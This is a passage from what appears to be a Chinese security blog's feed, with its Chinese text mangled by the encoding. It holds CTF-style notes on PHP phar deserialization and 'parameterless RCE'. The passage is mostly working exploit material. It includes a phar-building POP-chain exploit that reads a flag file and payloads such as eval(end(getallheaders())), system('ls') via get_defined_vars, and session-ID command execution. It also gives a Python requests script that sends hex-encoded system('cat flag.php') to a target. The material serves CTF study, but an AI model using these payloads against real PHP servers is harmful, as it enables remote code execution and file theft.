single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœä»¤<code>$this-&gt;str[&#39;str&#39;] = new Test()</code>é‚£ä¹ˆä¸å°±å¯ä»¥è§¦å‘Testç±»ä¸­çš„<code>__get</code>æ–¹æ³•äº†å—</p><p>å†æƒ³åˆ°<code>__toString</code>æ–¹æ³•çš„è§¦å‘æ–¹æ³•ï¼Œå½“ä¸€ä¸ªç±»æˆ–å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ï¼Œåœ¨C1e4rç±»ä¸­åˆšå¥½å¯åˆ©ç”¨</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¦‚æœä»¤ <code>$this-&gt;str = new Show()</code>å³å¯è§¦å‘</p><p>äºæ˜¯å®Œæ•´popé“¾å¦‚ä¸‹ï¼š</p><p><code>C1e4r::__destruct -&gt; Show::__toSting -&gt; Test::__get</code></p><p>æ³¨æ„ï¼Œè¿™é‡Œ<code>__get</code>æ–¹æ³•ä¸­çš„<code>$key</code>çš„å€¼ä¸ºè§¦å‘è¯¥æ–¹æ³•æ—¶ä¼ å…¥çš„ä¸å¯è®¿é—®å±æ€§çš„å€¼ï¼Œ</p><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯å¦‚æœ<code>$this-&gt;str[&#39;str&#39;]-&gt;abc   =====&gt;   __get(abc)</code>ï¼Œè€Œé¢˜ç›®ä¸­çš„æ˜¯å›ºå®šå¥½çš„<code>socure</code>ï¼Œ</p><p>æ‰€ä»¥åªéœ€è¦<code>params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;</code>å³å¯</p><p>expå¦‚ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸º phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½® stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span><span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>éšåæ”¹åç¼€ä¸ºjpgå†ä¸Šä¼ ï¼Œç„¶åæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«è¯»å–å³å¯get flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å‚è€ƒ&quot;&gt;&lt;a href=&quot;#å‚è€ƒ&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒ&quot;&gt;&lt;/a&gt;å‚è€ƒ&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2958#toc-2&quot;&gt;Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/205943.html&quot;&gt;PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHPæ— å‚æ•°RCE</title>
    <link href="https://www.extrader.top/posts/4f9c9406/"/>
    <id>https://www.extrader.top/posts/4f9c9406/</id>
    <published>2020-04-28T10:21:37.000Z</published>
    <updated>2020-08-09T04:24:49.958Z</updated>
    
    <content type="html"><![CDATA[<p>è†œè†œè†œè†œè†œè†œï¼ˆè¿™ä¸œè¥¿çœŸçš„æ˜¯å¥‡æ·«æŠ€å·§ï¼‰</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼š<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><span id="more"></span><p><strong>ç›®å½•ä¸‹æ–‡ä»¶</strong>ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="æµ‹è¯•ä»£ç "><a href="#æµ‹è¯•ä»£ç " class="headerlink" title="æµ‹è¯•ä»£ç "></a><strong>æµ‹è¯•ä»£ç </strong></h4><pre class="language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>(?R)</code>å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†<code>?</code>é€’å½’è°ƒç”¨</p><p>ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…<code>a(b(c()))</code>æˆ–<code>a()</code>è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…<code>a(&quot;123&quot;)</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯</p><ul><li><strong>getenv()</strong>ï¼šè·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ï¼Œ<code>phpinfo()</code>å¯ä»¥è·å–æ‰€æœ‰ç¯å¢ƒå˜é‡</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>RCE</p><ul><li><strong>end()</strong>ï¼šå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</li><li><strong>getallheaders()</strong>ï¼šè·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åˆ©ç”¨å…¨å±€å˜é‡è¿›RCE</p><ul><li><strong>get_defined_vars()</strong>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å›<code>$_GET,$_POST,$_COOKIE,$_FILES</code>å…¨å±€å˜é‡çš„å€¼</li><li><strong>current()</strong>ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›<code>$_GET</code>å˜é‡çš„æ•°ç»„å€¼</li><li><strong>get_defined_vars()</strong>ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œæ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚è¿”å›æ•°ç»„é¡ºåºä¸º<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>è€Œå¦‚æœç½‘ç«™å¯¹<code>$_GET,$_POST,$_COOKIE</code>éƒ½åšçš„è¿‡æ»¤ï¼Œ é‚£æˆ‘ä»¬åªèƒ½ä»<code>$_FILES</code>å…¥æ‰‹äº†ï¼Œexpå¦‚ä¸‹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>  txt <span class="token operator">=</span> <span class="token string">''</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>      txt <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token keyword">return</span> txtpayload <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    payload<span class="token punctuation">:</span> <span class="token string">b'extrader'</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># allow_redirects=False ç¦ç”¨é‡å®šå‘å¤„ç†</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li><strong>array_rand()</strong>ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ªï¼Œ<code>array_rand()</code>è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚</li><li><strong>end()</strong>ï¼šå°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå•å…ƒ</li><li><strong>hex2bin()</strong>ï¼šè½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li></ul><p>ç»“æœå°†è¾“å‡º<code>flag.php</code>æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œç”±äºç©ºæ ¼å’Œç‚¹éƒ½ä¼šè¢«æ›¿æ¢æˆä¸‹æ¢çº¿ï¼Œæ‰€ä»¥éœ€è¦ç”¨åå…­è¿›åˆ¶è¿›è¡Œç»•è¿‡</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>æ–‡ä»¶è¯»å–ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æŠ“åŒ…ä¼ å…¥Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span>æƒ³è¯»çš„æ–‡ä»¶<span class="token punctuation">)</span>å³å¯</code></pre><p>RCEï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>æŠ“åŒ…ä¼ å…¥Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('å‘½ä»¤')"</span>çš„åå…­è¿›åˆ¶<span class="token punctuation">)</span></code></pre><p>ä»¥ä¸Šçš„payloadå¥½åƒåªé€‚ç”¨äº<code>php7</code>ä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œphp7ä»¥ä¸Šçš„ä¸ä¼šæ˜¾ç¤º</p><ul><li><strong>session_start()</strong>ï¼šå¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› <strong><code>TRUE</code></strong> ï¼Œåä¹‹è¿”å› <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>ï¼šè·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰ã€‚</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>æ–‡ä»¶è¯»å–ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">å½“å‰ç›®å½•ï¼š<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ä¸Šçº§ç›®å½•æ–‡ä»¶ï¼š<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li><strong>getcwd()</strong>ï¼šå–å¾—å½“å‰å·¥ä½œç›®å½•ï¼ŒæˆåŠŸåˆ™è¿”å›å½“å‰å·¥ä½œç›®å½•ï¼Œå¤±è´¥è¿”å› <strong><code>FALSE</code></strong>ã€‚</li><li><strong>dirname()</strong>ï¼šè¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ï¼Œè¿”å› path çš„çˆ¶ç›®å½•ã€‚ å¦‚æœåœ¨ <code>path</code> ä¸­æ²¡æœ‰æ–œçº¿ï¼Œåˆ™è¿”å›ä¸€ä¸ªç‚¹ï¼ˆâ€™<em>.</em>â€˜ï¼‰ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ã€‚å¦åˆ™è¿”å›çš„æ˜¯æŠŠ <code>path</code> ä¸­ç»“å°¾çš„ <code>/component</code>ï¼ˆæœ€åä¸€ä¸ªæ–œçº¿ä»¥åŠåé¢éƒ¨åˆ†ï¼‰å»æ‰ä¹‹åçš„å­—ç¬¦ä¸²(ä¹Ÿå°±æ˜¯ä¸Šçº§ç›®å½•çš„æ–‡ä»¶è·¯å¾„)ã€‚</li><li><strong>chdir()</strong>ï¼šæ”¹å˜ç›®å½•ï¼ŒæˆåŠŸæ—¶è¿”å› <strong><code>TRUE</code></strong>ï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› <strong><code>FALSE</code></strong>ã€‚</li><li><strong>scandir()</strong>ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚æˆåŠŸåˆ™è¿”å›åŒ…å«æœ‰æ–‡ä»¶åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› <strong><code>FALSE</code></strong>ã€‚å¦‚æœ <code>directory</code> ä¸æ˜¯ä¸ªç›®å½•ï¼Œåˆ™è¿”å›å¸ƒå°”å€¼ <strong><code>FALSE</code></strong> å¹¶ç”Ÿæˆä¸€æ¡ <strong><code>E_WARNING</code></strong> çº§çš„é”™è¯¯ã€‚</li><li><strong>array_flip()</strong>ï¼šäº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ï¼Œå¦‚æœå¤±è´¥è¿”å› <strong><code>NULL</code></strong>ã€‚</li><li><strong>array_rand()</strong>ï¼šä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒï¼Œå¦‚æœåªå–å‡ºä¸€ä¸ª(é»˜è®¤ä¸º1)ï¼Œ<strong>array_rand()</strong> è¿”å›éšæœºå•å…ƒçš„é”®åã€‚ å¦åˆ™å°±è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ å®Œæˆåï¼Œå°±å¯ä»¥æ ¹æ®éšæœºçš„é”®è·å–æ•°ç»„çš„éšæœºå€¼ã€‚</li></ul><p><strong>array_flip()</strong>å’Œ<strong>array_rand()</strong>é…åˆä½¿ç”¨å¯éšæœºè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶å</p><p><strong>dirname(chdir(dirname()))</strong>é…åˆåˆ‡æ¢æ–‡ä»¶è·¯å¾„</p><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title=".ç»•è¿‡"></a><code>.</code>ç»•è¿‡</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>è¿”å›phpç‰ˆæœ¬ï¼Œå¦‚<code>7.3.5</code></li><li><code>floor(phpversion())</code>è¿”å›<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>è¿”å›<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>è¿”å›<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>è¿”å›<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>è¿”å›<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>è¿”å›<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>è¿”å›<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>æ‰«æå½“å‰ç›®å½•</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>è¿”å›<code>..</code></li></ul><p><strong>floor()</strong>ï¼šèˆå»æ³•å–æ•´ï¼Œ<strong>sqrt()</strong>ï¼šå¹³æ–¹æ ¹ï¼Œ<strong>tan()</strong>ï¼šæ­£åˆ‡å€¼ï¼Œ<strong>cosh()</strong>ï¼šåŒæ›²ä½™å¼¦ï¼Œ<strong>sinh()</strong>ï¼šåŒæ›²æ­£å¼¦ï¼Œ<strong>ceil()</strong>ï¼šè¿›ä¸€æ³•å–æ•´</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>è¿”å›<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ ç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯ $(å¤§æ¦‚ç‡) æˆ–è€… .(å°æ¦‚ç‡) ç„¶åé€šè¿‡ord chråªå–ç¬¬ä¸€ä¸ªå­—ç¬¦</li></ul><p><strong>crypt()</strong>ï¼šå•å‘å­—ç¬¦ä¸²æ•£åˆ—ï¼Œè¿”å›æ•£åˆ—åçš„å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå°‘äº 13 å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä»è€Œä¿è¯åœ¨å¤±è´¥æ—¶ä¸ç›å€¼åŒºåˆ†å¼€æ¥ã€‚</p><p><strong>hebrevc()</strong>ï¼šå°†é€»è¾‘é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆlogical-Hebrewï¼‰è½¬æ¢ä¸ºè§†è§‰é¡ºåºå¸Œä¼¯æ¥æ–‡ï¼ˆvisual-Hebrewï¼‰ï¼Œå¹¶ä¸”è½¬æ¢æ¢è¡Œç¬¦ï¼Œè¿”å›è§†è§‰é¡ºåºå­—ç¬¦ä¸²ã€‚</p><h4 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h4><p><strong>current()</strong>çš„åˆ«å<strong>pos()</strong></p><p><strong>readgzfile</strong>å¯ä»¥ä»£æ›¿<strong>readfile</strong></p><p>ç›®å½•æ“ä½œï¼š</p><ul><li><strong>getchwd()</strong> 